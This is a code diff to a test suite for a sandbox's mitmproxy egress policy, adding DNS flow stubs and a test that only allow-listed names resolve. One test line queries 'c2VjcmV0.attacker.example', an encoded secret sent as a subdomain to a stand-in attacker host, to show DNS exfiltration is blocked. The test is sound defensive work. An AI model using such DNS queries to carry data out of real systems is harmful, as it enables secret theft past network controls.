@@ -35,6 +35,18 @@ class HTTPFlow:
         self.request = Request(host)
         self.client_conn = Client(transparent, sni)
         self.response = None
+class Question:
+    def __init__(self, name):
+        self.name = name
+class DnsRequest:
+    def __init__(self, name):
+        self.question = Question(name) if name else None
+    def fail(self, code):
+        return "failed:" + str(code)
+class DnsFlow:
+    def __init__(self, name):
+        self.request = DnsRequest(name)
+        self.response = None
 class Server:
     def __init__(self, address):
         self.address = address
@@ -55,6 +67,10 @@ function policy(rules: object, steps: string): string {
   mkdirSync(join(root, 'mitmproxy'))
   writeFileSync(join(root, 'mitmproxy', '__init__.py'), '')
   writeFileSync(join(root, 'mitmproxy', 'http.py'), STUB)
+  mkdirSync(join(root, 'mitmproxy', 'net', 'dns'), { recursive: true })
+  writeFileSync(join(root, 'mitmproxy', 'net', '__init__.py'), '')
+  writeFileSync(join(root, 'mitmproxy', 'net', 'dns', '__init__.py'), '')
+  writeFileSync(join(root, 'mitmproxy', 'net', 'dns', 'response_codes.py'), 'REFUSED = 5\n')
   const file = join(root, 'rules.json')
   writeFileSync(file, JSON.stringify({ allow: rules }))
   const script = `
@@ -157,6 +173,22 @@ describe('the egress policy of a sandbox', () => {
     expect(out).toBe('Basic X\n403\n403')
   })
 
+  it('resolves only the names the rules allow, so a query cannot carry data to a name server', () => {
+    const out = policy(
+      { 'github.com': {}, '*.npmjs.org': {} },
+      [
+        'def ask(name):',
+        '    flow = http.DnsFlow(name)',
+        '    egress.dns_request(flow)',
+        '    return flow.response',
+        'print(ask("github.com"), ask("registry.npmjs.org"))',
+        'print(ask("c2VjcmV0.attacker.example"), ask(None))',
+      ].join('\n'),
+    )
+
+    expect(out).toBe('None None\nfailed:5 failed:5')
+  })
+
   it('names no function after a mitmproxy event it does not mean to handle', () => {
     // mitmproxy calls every module function named after an event. A helper named `load` was called with the
     // loader as an argument, the addon failed to load, and no sandbox could start until it was renamed.
@@ -208,6 +240,6 @@ describe('the egress policy of a sandbox', () => {
       `print(" ".join(sorted(n for n in ${JSON.stringify(events)} if callable(getattr(egress, n, None)))))`,
     )
 
-    expect(out).toBe('http_connect request server_connect')
+    expect(out).toBe('dns_request http_connect request server_connect')
   })
 })
